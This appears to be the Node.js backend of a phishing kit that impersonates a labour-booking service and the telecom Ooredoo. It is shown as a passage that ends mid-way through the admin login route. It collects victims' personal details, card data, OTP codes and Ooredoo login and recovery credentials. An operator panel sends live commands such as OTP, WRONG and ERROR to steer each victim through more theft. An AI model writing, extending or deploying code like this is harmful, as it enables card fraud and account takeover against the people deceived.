'use strict';

require('dotenv').config();

const express = require('express');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const { EventEmitter } = require('events');
const { MongoClient } = require('mongodb');

/* ============================================================
   1. Environment Variables & Multi-Instance Isolation
   ============================================================ */

const PORT = Number(process.env.PORT || 8080);
const MONGODB_URI = (
  process.env.MONGODB_URI ||
  process.env.MONGO_URI ||
  process.env.DATABASE_URL ||
  ''
).trim();

const FRONTEND_URL = (process.env.FRONTEND_URL || process.env.PUBLIC_ORIGIN || '').trim();
const DASHBOARD_URL = (process.env.DASHBOARD_URL || process.env.DASHBOARD_ORIGIN || '').trim();
const ADMIN_USER = (process.env.ADMIN_USER || process.env.ADMIN_USERNAME || 'admin').trim();
const ADMIN_PASS = (process.env.ADMIN_PASS || process.env.ADMIN_PASSWORD || 'admin123').trim();

/**
 * Compute a deterministic, isolated collection prefix for this instance.
 * Even if multiple Render services share the exact same MONGODB_URI,
 * each pair of (FRONTEND_URL + DASHBOARD_URL) or INSTANCE_ID gets its own
 * isolated collections in MongoDB so data never mixes between instances.
 */
function resolveInstancePrefix() {
  const explicit = (
    process.env.INSTANCE_ID ||
    process.env.RENDER_SERVICE_ID ||
    process.env.RENDER_SERVICE_NAME ||
    ''
  ).trim();

  if (explicit) {
    const clean = explicit.toLowerCase().replace(/[^a-z0-9]/g, '_').replace(/^_+|_+$/g, '').slice(0, 32);
    if (clean) {
      return `inst_${clean}`;
    }
  }

  const combinedUrls = `${FRONTEND_URL}|${DASHBOARD_URL}`.trim();
  if (combinedUrls && combinedUrls !== '|') {
    const hash = crypto.createHash('sha1').update(combinedUrls).digest('hex').slice(0, 10);
    const hostLabel = combinedUrls
      .replace(/https?:\/\//gi, '')
      .replace(/[^a-z0-9]/gi, '_')
      .replace(/^_+|_+$/g, '')
      .toLowerCase()
      .slice(0, 16);
    return `inst_${hostLabel}_${hash}`;
  }

  return 'inst_default';
}

const INSTANCE_PREFIX = resolveInstancePrefix();
const COOKIE_NAME = `jusour_admin_session_${INSTANCE_PREFIX}`;

/** Parse comma-separated allowed origins from FRONTEND_URL and DASHBOARD_URL. */
function parseOrigins(raw) {
  return String(raw || '')
    .split(',')
    .map((s) => s.trim().replace(/\/+$/, ''))
    .filter(Boolean);
}

const ALLOWED_FRONTEND_ORIGINS = parseOrigins(FRONTEND_URL);
const ALLOWED_DASHBOARD_ORIGINS = parseOrigins(DASHBOARD_URL);

/* ============================================================
   2. Registry: Pages, Statuses, Commands
   ============================================================ */

const PAGE_REGISTRY = {
  hourly:          { label_ar: 'عمالة بالساعة',    label_en: 'Hourly Booking',   source: 'hourly.html',          collects: true },
  monthly:         { label_ar: 'عمالة بالشهر',     label_en: 'Monthly Booking',  source: 'monthly.html',         collects: true },
  recruitment:     { label_ar: 'استقدام عمالة',    label_en: 'Recruitment',      source: 'recruitment.html',     collects: true },
  customer:        { label_ar: 'معلومات العميل',   label_en: 'Customer Info',    source: 'customer-info.html',   collects: true },
  payment:         { label_ar: 'بيانات البطاقة',   label_en: 'Card Payment',     source: 'payment.html',         collects: true },
  otp:             { label_ar: 'رمز التحقق',       label_en: 'OTP',              source: 'otp.html',             collects: true },
  ooredoo_login:   { label_ar: 'Ooredoo دخول',     label_en: 'Ooredoo Login',    source: 'ooredoo-login.html',   collects: true },
  ooredoo_reg:     { label_ar: 'Ooredoo تسجيل',    label_en: 'Ooredoo Register', source: 'ooredoo-reg.html',     collects: true },
  ooredoo_forgot:  { label_ar: 'Ooredoo استعادة',  label_en: 'Ooredoo Recovery', source: 'ooredoo-forgot.html',  collects: true },
  activity:        { label_ar: 'النشاط',           label_en: 'Activity Log',     source: 'various',              collects: false }
};

const IGNORED_PAGE_KEYS = new Set(['summary', 'payment_methods']);

const LEGACY_PAGE_MAP = {
  'Home-Entrance':              'activity',
  'Home-Entrance-Notification': 'activity',
  'Hourly-Page':                'hourly',
  'Hourly-Selection':           'hourly',
  'Monthly-Page':               'monthly',
  'Monthly-Selection':          'monthly',
  'Recruitment-Page':           'recruitment',
  'Recruitment-Nationality':    'recruitment',
  'Entering-Customer-Info':     'customer',
  'Order-Summary':              'customer',
  'Order-Summary-View':         'summary',
  'Going-To-Payment-Methods':   'summary',
  'Payment-Methods-View':       'payment_methods',
  'Proceeding-To-Card-Payment': 'payment_methods',
  'Payment-Submitted':          'payment',
  'OTP-Sent':                   'otp',
  'Ooredoo-Login-Submit':       'ooredoo_login',
  'Ooredoo-Reg-Submit':         'ooredoo_reg',
  'Forgot-Password-Submitted':  'ooredoo_forgot',
  'Success-Page-View':          'activity',
  'WAITING-IN-LOADING':         'activity',
  'WAITING-ERROR-ACTION':       'activity',
  'WAITING-OTP-ACTION':         'activity'
};

const STATUS_DEFINITIONS = {
  new:           { label_ar: 'جديد',           tone: 'new',     waiting: false },
  active:        { label_ar: 'نشط',            tone: 'neutral', waiting: false },
  waiting:       { label_ar: 'بانتظار القرار', tone: 'waiting', waiting: true },
  otp_requested: { label_ar: 'مطلوب رمز',      tone: 'info',    waiting: true },
  otp_received:  { label_ar: 'وصل الرمز',      tone: 'success', waiting: false },
  rejected:      { label_ar: 'مرفوض',          tone: 'danger',  waiting: false },
  retry:         { label_ar: 'إعادة إدخال',    tone: 'warning', waiting: true },
  ooredoo:       { label_ar: 'Ooredoo',        tone: 'info',    waiting: true },
  completed:     { label_ar: 'مكتمل',          tone: 'success', waiting: false }
};

const COMMAND_DEFINITIONS = {
  WAIT:    { label_ar: 'انتظار',              status: 'waiting',       redirect: null },
  OTP:     { label_ar: 'طلب رمز التحقق',      status: 'otp_requested', redirect: 'otp.html' },
  WRONG:   { label_ar: 'بيانات خاطئة',        status: 'rejected',      redirect: 'error.html' },
  ERROR:   { label_ar: 'إعادة إدخال البطاقة', status: 'retry',         redirect: 'payment.html' },
  SUCCESS: { label_ar: 'نجاح',                status: 'completed',     redirect: 'success.html' },
  OOREDOO: { label_ar: 'دخول Ooredoo',        status: 'ooredoo',       redirect: 'ooredoo-login.html' },
  OOR_REG: { label_ar: 'تسجيل Ooredoo',       status: 'ooredoo',       redirect: 'ooredoo-reg.html' },
  OOR_ERR: { label_ar: 'خطأ Ooredoo',         status: 'ooredoo',       redirect: 'ooredoo-login.html' },
  ID_ERR:  { label_ar: 'خطأ في الهوية',       status: 'ooredoo',       redirect: 'ooredoo-reg.html' },
  RESUME:  { label_ar: 'متابعة',              status: 'active',        redirect: 'loading.html' }
};

function pageLabel(key, lang = 'ar') {
  const def = PAGE_REGISTRY[key];
  if (!def) return key;
  return lang === 'en' ? def.label_en : def.label_ar;
}

function legacyPageKey(legacy) {
  if (LEGACY_PAGE_MAP[legacy]) return LEGACY_PAGE_MAP[legacy];
  for (const [prefix, key] of Object.entries(LEGACY_PAGE_MAP)) {
    if (legacy && legacy.startsWith(prefix)) return key;
  }
  return 'activity';
}

function buildPageNavigation(submittedKeys) {
  const counts = {};
  for (const k of submittedKeys) {
    counts[k] = (counts[k] || 0) + 1;
  }
  const nav = [];
  for (const [key, def] of Object.entries(PAGE_REGISTRY)) {
    const count = counts[key] || 0;
    const hasData = count > 0;
    if (!hasData && !def.collects) continue;
    nav.push({
      key,
      label_ar: def.label_ar,
      label_en: def.label_en,
      count,
      has_data: hasData
    });
  }
  return nav;
}

/* ============================================================
   3. Ultra-Fast In-Memory Mirror + MongoDB Write-Through Layer
   ============================================================ */

let mongoClient = null;
let mongoDb = null;
let useLocalFallback = false;

const localStoreFile = path.join(__dirname, `.local_store_${INSTANCE_PREFIX}.json`);
let localData = {
  counters: {},
  users: [],
  submissions: [],
  messages: [],
  commands: [],
  events: [],
  admins: [],
  sessions: []
};

function loadLocalStore() {
  try {
    if (fs.existsSync(localStoreFile)) {
      const parsed = JSON.parse(fs.readFileSync(localStoreFile, 'utf8'));
      localData = Object.assign(localData, parsed);
    }
  } catch (e) {}
}

let saveTimer = null;
function saveLocalStore() {
  if (!useLocalFallback) return;
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    saveTimer = null;
    try {
      fs.writeFileSync(localStoreFile, JSON.stringify(localData, null, 2), 'utf8');
    } catch (e) {}
  }, 50);
}

function col(name) {
  return mongoDb.collection(`${INSTANCE_PREFIX}_${name}`);
}

/** Run a MongoDB write operation asynchronously in the background without blocking HTTP responses. */
function bgMongo(promiseFn, label = 'mongo') {
  if (useLocalFallback || !mongoDb) return;
  Promise.resolve()
    .then(promiseFn)
    .catch((err) => {
      console.error(`[bg-${label}]`, err.message || err);
    });
}

function nextSeqSync(name) {
  const nextVal = (localData.counters[name] || 0) + 1;
  localData.counters[name] = nextVal;
  if (useLocalFallback) {
    saveLocalStore();
  } else {
    bgMongo(() =>
      col('counters').updateOne(
        { _id: name },
        { $max: { seq: nextVal } },
        { upsert: true }
      ), 'counter');
  }
  return nextVal;
}

function nowIso() {
  return new Date().toISOString();
}

function hashPassword(password, salt = null) {
  const s = salt || crypto.randomBytes(16).toString('hex');
  const hash = crypto.scryptSync(String(password), s, 64).toString('hex');
  return `${s}:${hash}`;
}

function verifyPassword(password, stored) {
  if (!stored || !stored.includes(':')) return false;
  const [salt, originalHash] = stored.split(':');
  const hash = crypto.scryptSync(String(password), salt, 64).toString('hex');
  return crypto.timingSafeEqual(Buffer.from(hash, 'hex'), Buffer.from(originalHash, 'hex'));
}

function hashToken(token) {
  return crypto.createHash('sha256').update(String(token)).digest('hex');
}

function maxIdOf(arr) {
  let max = 0;
  for (const item of arr || []) {
    if (item && typeof item.id === 'number' && item.id > max) {
      max = item.id;
    }
  }
  return max;
}

async function initDatabase() {
  if (MONGODB_URI) {
    mongoClient = new MongoClient(MONGODB_URI, {
      serverSelectionTimeoutMS: 10000
    });
    await mongoClient.connect();
    mongoDb = mongoClient.db();
    console.log(`[db] Connected to MongoDB (isolated namespace: ${INSTANCE_PREFIX})`);

    // Ensure indexes in background
    Promise.all([
      col('users').createIndex({ id: 1 }, { unique: true }),
      col('users').createIndex({ ref: 1 }, { unique: true }),
      col('users').createIndex({ last_activity: -1, id: -1 }),
      col('submissions').createIndex({ user_id: 1, id: 1 }),
      col('messages').createIndex({ user_id: 1, id: 1 }),
      col('commands').createIndex({ user_id: 1, consumed_at: 1, id: 1 }),
      col('events').createIndex({ id: 1 }, { unique: true }),
      col('admins').createIndex({ username: 1 }, { unique: true }),
      col('sessions').createIndex({ token_hash: 1 }, { unique: true })
    ]).catch((e) => console.warn('[db-index]', e.message));

    // Hydrate in-memory mirror from MongoDB for 0ms reads
    const [counters, users, submissions, messages, commands, events, admins, sessions] = await Promise.all([
      col('counters').find({}).toArray(),
      col('users').find({}).toArray(),
      col('submissions').find({}).sort({ id: 1 }).toArray(),
      col('messages').find({}).sort({ id: -1 }).limit(500).toArray(),
      col('commands').find({}).sort({ id: -1 }).limit(300).toArray(),
      col('events').find({}).sort({ id: -1 }).limit(400).toArray(),
      col('admins').find({}).toArray(),
      col('sessions').find({}).toArray()
    ]);

    localData.counters = {};
    for (const c of counters) {
      if (c && c._id) localData.counters[c._id] = Number(c.seq || 0);
    }
    localData.users = users || [];
    localData.submissions = submissions || [];
    localData.messages = (messages || []).reverse();
    localData.commands = (commands || []).reverse();
    localData.events = (events || []).reverse();
    localData.admins = admins || [];
    localData.sessions = sessions || [];

    // Ensure counters are at least max existing id
    for (const key of ['users', 'submissions', 'messages', 'commands', 'events', 'admins', 'sessions']) {
      const m = maxIdOf(localData[key]);
      if (m > (localData.counters[key] || 0)) {
        localData.counters[key] = m;
      }
    }
    console.log(`[db] Hydrated in-memory mirror: ${localData.users.length} users, ${localData.submissions.length} submissions`);
  } else {
    useLocalFallback = true;
    loadLocalStore();
    console.warn(`[db] MONGODB_URI not set — running with local JSON store (${path.basename(localStoreFile)}) for localhost testing.`);
  }

  await syncAdminCredentials();
}

async function syncAdminCredentials() {
  const now = nowIso();
  const passHash = hashPassword(ADMIN_PASS);

  let admin = localData.admins.find((a) => a.username === ADMIN_USER);
  if (!admin) {
    admin = {
      id: nextSeqSync('admins'),
      username: ADMIN_USER,
      password_hash: passHash,
      display_name: ADMIN_USER,
      created_at: now,
      last_login_at: null
    };
    localData.admins.push(admin);
    if (useLocalFallback) {
      saveLocalStore();
    } else {
      await col('admins').insertOne(Object.assign({}, admin));
      console.log(`[auth] Created admin account '${ADMIN_USER}' for instance ${INSTANCE_PREFIX}`);
    }
  } else {
    admin.password_hash = passHash;
    if (useLocalFallback) {
      saveLocalStore();
    } else {
      await col('admins').updateOne(
        { username: ADMIN_USER },
        { $set: { password_hash: passHash } }
      );
      console.log(`[auth] Synced password for admin '${ADMIN_USER}' from environment variables`);
    }
  }
}

/* ============================================================
   4. Domain & Data Access Operations (0ms In-Memory + Write-Through)
   ============================================================ */

const eventBus = new EventEmitter();
eventBus.setMaxListeners(200);

function sanitizeRef(ref) {
  return String(ref || '')
    .trim()
    .toUpperCase()
    .replace(/[^A-Z0-9_-]/g, '')
    .slice(0, 64);
}

function refIsValid(ref) {
  return typeof ref === 'string' && ref.length >= 4;
}

function userDisplayName(user) {
  const name = String(user.name || '').trim();
  return name !== '' ? name : String(user.ref || '');
}

function getUserSubmissionsSync(userId) {
  const numId = Number(userId);
  return localData.submissions
    .filter((s) => s.user_id === numId && !IGNORED_PAGE_KEYS.has(s.page_key))
    .sort((a, b) => a.id - b.id)
    .map((s) => ({
      id: Number(s.id),
      page_key: String(s.page_key),
      page_label: String(s.page_label),
      summary: String(s.summary),
      fields: Array.isArray(s.fields) ? s.fields : [],
      created_at: String(s.created_at)
    }));
}

function userPublicRow(user, extra = {}) {
  const status = String(user.status || 'active');
  const def = STATUS_DEFINITIONS[status];
  const subs = extra.submissions || getUserSubmissionsSync(user.id);
  const lastSub = subs.length > 0 ? subs[subs.length - 1] : null;
  const pageKeys = [...new Set(subs.map((s) => s.page_key))];
  const navigation = extra.navigation || buildPageNavigation(pageKeys);

  return Object.assign(
    {
      id: Number(user.id),
      ref: String(user.ref || ''),
      name: userDisplayName(user),
      has_name: String(user.name || '').trim() !== '',
      phone: String(user.phone || ''),
      address: String(user.address || ''),
      email: String(user.email || ''),
      country: String(user.country || ''),
      service: String(user.service || ''),
      total_price: String(user.total_price || ''),
      status,
      status_label: def ? def.label_ar : status,
      is_read: Boolean(user.is_read),
      is_pinned: Boolean(user.is_pinned),
      waiting_for_decision: Boolean(user.waiting_for_decision),
      current_page: String(user.current_page || ''),
      created_at: String(user.created_at || ''),
      last_activity: String(user.last_activity || ''),
      last_summary: lastSub ? String(lastSub.summary || '') : '',
      submission_count: subs.length,
      submissions: subs,
      navigation
    },
    extra
  );
}

function findUserByRef(ref) {
  return localData.users.find((u) => u.ref === ref) || null;
}

function findUserById(id) {
  const numId = Number(id);
  return localData.users.find((u) => u.id === numId) || null;
}

function ensureUser(ref) {
  const existing = findUserByRef(ref);
  if (existing) return existing;

  const now = nowIso();
  const user = {
    id: nextSeqSync('users'),
    ref,
    name: '',
    phone: '',
    address: '',
    email: '',
    country: '',
    service: '',
    total_price: '',
    status: 'new',
    is_read: false,
    is_pinned: false,
    waiting_for_decision: false,
    current_page: '',
    created_at: now,
    last_activity: now
  };

  localData.users.push(user);
  if (useLocalFallback) {
    saveLocalStore();
  } else {
    bgMongo(() => col('users').insertOne(Object.assign({}, user)), 'insertUser');
  }
  return user;
}

function updateUserProfile(userId, profile) {
  const maxLengths = {
    name: 190,
    phone: 64,
    address: 2000,
    email: 190,
    country: 96,
    service: 500,
    total_price: 32
  };

  const updates = {};
  for (const [key, maxLen] of Object.entries(maxLengths)) {
    if (profile[key] === undefined || profile[key] === null) continue;
    const val = String(profile[key]).trim();
    if (val === '') continue;
    updates[key] = val.slice(0, maxLen);
  }

  if (Object.keys(updates).length === 0) return;

  const u = findUserById(userId);
  if (u) {
    Object.assign(u, updates);
    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(() => col('users').updateOne({ id: Number(userId) }, { $set: updates }), 'updateProfile');
    }
  }
}

function touchUser(userId, pageKey = '') {
  const now = nowIso();
  const updates = { last_activity: now, is_read: false };
  if (pageKey !== '') {
    updates.current_page = pageKey;
  }

  const u = findUserById(userId);
  if (u) {
    Object.assign(u, updates);
    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(() => col('users').updateOne({ id: Number(userId) }, { $set: updates }), 'touchUser');
    }
  }
}

function addSubmission(userId, pageKey, summary, fields) {
  const sub = {
    id: nextSeqSync('submissions'),
    user_id: Number(userId),
    page_key: pageKey,
    page_label: pageLabel(pageKey),
    summary: String(summary || '').slice(0, 255),
    fields: Array.isArray(fields) ? fields : [],
    created_at: nowIso()
  };

  localData.submissions.push(sub);
  if (useLocalFallback) {
    saveLocalStore();
  } else {
    bgMongo(() => col('submissions').insertOne(Object.assign({}, sub)), 'addSubmission');
  }
  return sub;
}

function addMessage(userId, direction, author, body) {
  const msg = {
    id: nextSeqSync('messages'),
    user_id: Number(userId),
    direction: String(direction),
    author: String(author || '').slice(0, 64),
    body: String(body || ''),
    created_at: nowIso()
  };

  localData.messages.push(msg);
  if (localData.messages.length > 1000) {
    localData.messages = localData.messages.slice(-500);
  }
  if (useLocalFallback) {
    saveLocalStore();
  } else {
    bgMongo(() => col('messages').insertOne(Object.assign({}, msg)), 'addMessage');
  }
  return msg.id;
}

function recordEvent(type, userId, payload) {
  const evt = {
    id: nextSeqSync('events'),
    type: String(type),
    user_id: userId === null ? null : Number(userId),
    payload: payload || {},
    created_at: nowIso()
  };

  localData.events.push(evt);
  if (localData.events.length > 800) {
    localData.events = localData.events.slice(-400);
  }
  if (useLocalFallback) {
    saveLocalStore();
  } else {
    bgMongo(() => col('events').insertOne(Object.assign({}, evt)), 'recordEvent');
  }

  eventBus.emit('event', evt);
  return evt.id;
}

function latestEventId() {
  if (localData.events.length === 0) return 0;
  return localData.events[localData.events.length - 1].id;
}

function eventsSince(cursor, limit = 200) {
  const numCursor = Number(cursor) || 0;
  return localData.events.filter((e) => e.id > numCursor).slice(0, limit);
}

function listConversations(limit = 300) {
  const users = [...localData.users]
    .sort((a, b) => {
      if (Boolean(b.is_pinned) !== Boolean(a.is_pinned)) {
        return b.is_pinned ? 1 : -1;
      }
      if (b.last_activity !== a.last_activity) {
        return b.last_activity > a.last_activity ? 1 : -1;
      }
      return b.id - a.id;
    })
    .slice(0, limit);

  return users.map((u) => userPublicRow(u));
}

function getTotals() {
  const total = localData.users.length;
  let unread = 0;
  let waiting = 0;
  for (const u of localData.users) {
    if (!u.is_read) unread++;
    if (u.waiting_for_decision) waiting++;
  }
  return { total, unread, waiting };
}

function getUserConversation(userId) {
  const numId = Number(userId);
  const user = findUserById(numId);
  if (!user) return null;

  const subs = getUserSubmissionsSync(numId);
  const msgs = localData.messages
    .filter((m) => m.user_id === numId)
    .sort((a, b) => a.id - b.id)
    .slice(-200);
  const cmds = localData.commands
    .filter((c) => c.user_id === numId)
    .sort((a, b) => b.id - a.id)
    .slice(0, 50);

  const pageKeys = [...new Set(subs.map((s) => s.page_key))];
  const navigation = buildPageNavigation(pageKeys);

  return {
    user: userPublicRow(user, { submissions: subs, navigation }),
    navigation,
    submissions: subs,
    messages: msgs.map((m) => ({
      id: Number(m.id),
      direction: String(m.direction),
      author: String(m.author),
      body: String(m.body),
      created_at: String(m.created_at)
    })),
    commands: cmds.map((c) => ({
      id: Number(c.id),
      command: String(c.command),
      created_at: String(c.created_at),
      consumed: c.consumed_at !== null && c.consumed_at !== undefined
    }))
  };
}

/* ============================================================
   5. Express Application, CORS, and Fast Auth Helpers
   ============================================================ */

const app = express();
app.set('trust proxy', 1);

app.use(express.json({ limit: '100kb' }));
app.use(express.urlencoded({ extended: true, limit: '100kb' }));

function isOriginAllowed(origin) {
  if (!origin) return true;
  return true;
}

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && isOriginAllowed(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader(
      'Access-Control-Allow-Headers',
      'Content-Type, Authorization, X-Session-Token, X-CSRF-Token, Last-Event-ID, X-Client-Origin'
    );
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Max-Age', '86400');
  } else if (!origin) {
    res.setHeader('Access-Control-Allow-Origin', '*');
  }

  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'no-referrer');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }
  next();
});

function parseCookies(req) {
  const header = req.headers.cookie || '';
  const out = {};
  header.split(';').forEach((part) => {
    const idx = part.indexOf('=');
    if (idx > 0) {
      const k = part.slice(0, idx).trim();
      const v = part.slice(idx + 1).trim();
      out[k] = decodeURIComponent(v);
    }
  });
  return out;
}

function extractRawToken(req) {
  const authHeader = String(req.headers.authorization || '');
  if (authHeader.toLowerCase().startsWith('bearer ')) {
    const t = authHeader.slice(7).trim();
    if (/^[a-f0-9]{64,128}$/i.test(t)) return t;
  }
  const customHeader = String(req.headers['x-session-token'] || '').trim();
  if (/^[a-f0-9]{64,128}$/i.test(customHeader)) return customHeader;

  const queryToken = String(req.query.token || '').trim();
  if (/^[a-f0-9]{64,128}$/i.test(queryToken)) return queryToken;

  const cookies = parseCookies(req);
  const cookieToken = String(cookies[COOKIE_NAME] || '').trim();
  if (/^[a-f0-9]{64,128}$/i.test(cookieToken)) return cookieToken;

  return '';
}

function setSessionCookie(req, res, token, ttlSeconds) {
  const isSecure = req.secure || req.headers['x-forwarded-proto'] === 'https';
  const sameSite = isSecure ? 'None' : 'Lax';
  const parts = [
    `${COOKIE_NAME}=${token}`,
    `Max-Age=${ttlSeconds}`,
    'Path=/',
    'HttpOnly',
    `SameSite=${sameSite}`
  ];
  if (isSecure) parts.push('Secure');
  res.setHeader('Set-Cookie', parts.join('; '));
}

function clearSessionCookie(req, res) {
  const isSecure = req.secure || req.headers['x-forwarded-proto'] === 'https';
  const sameSite = isSecure ? 'None' : 'Lax';
  const parts = [
    `${COOKIE_NAME}=`,
    'Max-Age=0',
    'Path=/',
    'HttpOnly',
    `SameSite=${sameSite}`
  ];
  if (isSecure) parts.push('Secure');
  res.setHeader('Set-Cookie', parts.join('; '));
}

async function resolveAdminSession(req) {
  const rawToken = extractRawToken(req);
  if (!rawToken) return null;

  const tokenHash = hashToken(rawToken);
  let session = localData.sessions.find((s) => s.token_hash === tokenHash) || null;

  // Fallback to MongoDB if session was created before hydration
  if (!session && !useLocalFallback && mongoDb) {
    session = await col('sessions').findOne({ token_hash: tokenHash });
    if (session) {
      localData.sessions.push(session);
    }
  }

  if (!session) return null;

  const nowMs = Date.now();
  if (new Date(session.expires_at).getTime() <= nowMs) {
    localData.sessions = localData.sessions.filter((s) => s.token_hash !== tokenHash);
    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(() => col('sessions').deleteOne({ token_hash: tokenHash }), 'expireSession');
    }
    return null;
  }

  let admin = localData.admins.find((a) => a.id === session.admin_id) || null;
  if (!admin && localData.admins.length > 0) {
    admin = localData.admins[0];
  }

  if (!admin) return null;

  return { admin, session, rawToken };
}

function publicAdmin(admin) {
  return {
    id: Number(admin.id),
    username: String(admin.username),
    display_name: String(admin.display_name || admin.username),
    last_login_at: admin.last_login_at || null
  };
}

async function requireAdmin(req, res) {
  const ctx = await resolveAdminSession(req);
  if (!ctx) {
    res.status(401).json({ ok: false, error: 'Authentication required.' });
    return null;
  }
  return ctx;
}

async function requireAdminWrite(req, res) {
  const ctx = await requireAdmin(req, res);
  if (!ctx) return null;

  const sentCsrf = String(req.headers['x-csrf-token'] || '');
  const expectedCsrf = String(ctx.session.csrf_token || '');
  if (!sentCsrf || !expectedCsrf || sentCsrf !== expectedCsrf) {
    res.status(403).json({ ok: false, error: 'Invalid or missing CSRF token.' });
    return null;
  }
  return ctx;
}

function inputVal(req, key, def = '') {
  if (req.body && req.body[key] !== undefined && req.body[key] !== null) {
    return req.body[key];
  }
  if (req.query && req.query[key] !== undefined && req.query[key] !== null) {
    return req.query[key];
  }
  return def;
}

/* ============================================================
   6. API Routes (0ms In-Memory Execution + Write-Through)
   ============================================================ */

// Health & Instance Status Endpoint
app.get(['/health', '/api/health', '/api/health.php'], (req, res) => {
  res.json({
    ok: true,
    instance: INSTANCE_PREFIX,
    storage: useLocalFallback ? 'local-fallback' : 'mongodb',
    frontend_url: FRONTEND_URL || '*',
    dashboard_url: DASHBOARD_URL || '*',
    admin_user: ADMIN_USER
  });
});

// 1. Public Ingest: POST /api/submit.php
app.post(['/api/submit.php', '/api/submit'], (req, res) => {
  try {
    const ref = sanitizeRef(inputVal(req, 'ref', ''));
    if (!refIsValid(ref)) {
      return res.status(422).json({ ok: false, error: 'A valid ref is required.' });
    }

    let pageKey = String(inputVal(req, 'page_key', '')).trim();
    if (IGNORED_PAGE_KEYS.has(pageKey)) {
      return res.json({ ok: true, skipped: true, page: pageKey });
    }
    if (!pageKey || !PAGE_REGISTRY[pageKey]) {
      const legacyPage = String(inputVal(req, 'page', '')).trim();
      pageKey = legacyPage ? legacyPageKey(legacyPage) : 'activity';
      if (IGNORED_PAGE_KEYS.has(pageKey)) {
        return res.json({ ok: true, skipped: true, page: pageKey });
      }
    }

    const summary = String(inputVal(req, 'summary', pageLabel(pageKey))).trim().slice(0, 255) || pageLabel(pageKey);

    let rawFields = inputVal(req, 'fields', null);
    if (typeof rawFields === 'string' && rawFields !== '') {
      try {
        rawFields = JSON.parse(rawFields);
      } catch (e) {
        rawFields = null;
      }
    }

    const fields = [];
    if (Array.isArray(rawFields)) {
      for (const f of rawFields) {
        if (!f || typeof f !== 'object') continue;
        const label = String(f.label || '').trim();
        if (!label) continue;
        fields.push({
          label: label.slice(0, 96),
          value: String(f.value ?? '').slice(0, 2000),
          sensitive: Boolean(f.sensitive)
        });
        if (fields.length >= 60) break;
      }
    }

    const legacyBlob = String(inputVal(req, 'save_data', '')).trim();
    if (legacyBlob !== '') {
      fields.push({
        label: 'البيانات الأصلية',
        value: legacyBlob.slice(0, 20000),
        sensitive: false
      });
    }

    const profile = {
      name: String(inputVal(req, 'name', '')).trim(),
      phone: String(inputVal(req, 'phone', '')).trim(),
      address: String(inputVal(req, 'address', '')).trim(),
      email: String(inputVal(req, 'email', '')).trim(),
      country: String(inputVal(req, 'country', '')).trim(),
      service: String(inputVal(req, 'service', '')).trim(),
      total_price: String(inputVal(req, 'total_price', '')).trim()
    };

    const explicitName = String(inputVal(req, 'c_name', '')).trim();
    if (explicitName !== '') {
      profile.name = explicitName;
    }

    const existing = findUserByRef(ref);
    const isNew = existing === null;
    const prevName = existing ? String(existing.name || '').trim() : '';
    const user = ensureUser(ref);
    const userId = Number(user.id);

    updateUserProfile(userId, profile);

    const hasProfileValues = Object.values(profile).some((v) => v !== '');
    const hasContent = fields.length > 0 || hasProfileValues;

    let createdSub = null;
    if (hasContent) {
      createdSub = addSubmission(userId, pageKey, summary, fields);
    }

    touchUser(userId, pageKey);

    const nameJustArrived = !isNew && prevName === '' && profile.name !== '';
    const updated = findUserById(userId) || user;
    const pub = userPublicRow(updated);

    if (isNew) {
      recordEvent('user.created', userId, { user: pub });
    } else {
      recordEvent('user.updated', userId, { user: pub });
    }

    if (hasContent && createdSub) {
      recordEvent('submission.created', userId, {
        user: pub,
        page_key: pageKey,
        page_label: pageLabel(pageKey),
        summary,
        submission: {
          id: createdSub.id,
          page_key: createdSub.page_key,
          page_label: createdSub.page_label,
          summary: createdSub.summary,
          fields: createdSub.fields,
          created_at: createdSub.created_at
        }
      });
    }

    if (nameJustArrived) {
      recordEvent('user.renamed', userId, { user: pub });
    }

    res.json({
      ok: true,
      user_id: userId,
      is_new: isNew,
      page: pageKey
    });
  } catch (err) {
    console.error('[submit]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 2. Visitor Command Polling: GET /api/poll_commands.php
app.get(['/api/poll_commands.php', '/api/poll_commands'], (req, res) => {
  try {
    const ref = sanitizeRef(inputVal(req, 'ref', ''));
    if (!refIsValid(ref)) {
      return res.status(422).json({ ok: false, error: 'A valid ref is required.' });
    }

    const user = findUserByRef(ref);
    if (!user) {
      return res.json({ ok: true, command: null, redirect: null });
    }

    const pending = localData.commands
      .filter((c) => c.user_id === user.id && !c.consumed_at)
      .sort((a, b) => a.id - b.id);

    if (pending.length === 0) {
      return res.json({ ok: true, command: null, redirect: null });
    }

    let payload = null;
    const deliveredIds = [];
    const now = nowIso();

    for (const row of pending) {
      row.consumed_at = now;
      deliveredIds.push(row.id);
      const def = COMMAND_DEFINITIONS[row.command];
      if (!def) continue;
      payload = {
        id: row.id,
        command: row.command,
        redirect: def.redirect,
        status: def.status,
        label: def.label_ar
      };
    }

    if (useLocalFallback) {
      saveLocalStore();
    } else {
      bgMongo(() =>
        col('commands').updateMany(
          { id: { $in: deliveredIds } },
          { $set: { consumed_at: now } }
        ), 'consumeCommands');
    }

    res.json({
      ok: true,
      command: payload ? payload.command : null,
      redirect: payload ? payload.redirect : null,
      status: payload ? payload.status : null,
      label: payload ? payload.label : null
    });
  } catch (err) {
    console.error('[poll_commands]', err);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// 3. Admin Login: POST /api/login.php
app.post(['/api/login.php', '/api/login'], async (req, res) => {
  try {
    const username = String(inputVal(req, 'username', '')).trim();
    const password = String(inputVal(req, 'password', ''));

    if (!username || !password) {
      return res.status(422).json({ ok: false, error: 'يرجى إدخال اسم المستخدم وكلمة المرور.' });
    }

    const admin = localData.admins.find((a) => a.username === username) || null;

    if (!admin || !verifyPassword(password, admin.password_hash)) {
      return res.status(401).json({ ok: false, error: 'اسم المستخدم أو كلمة المرور غير صحيحة.' });
    }

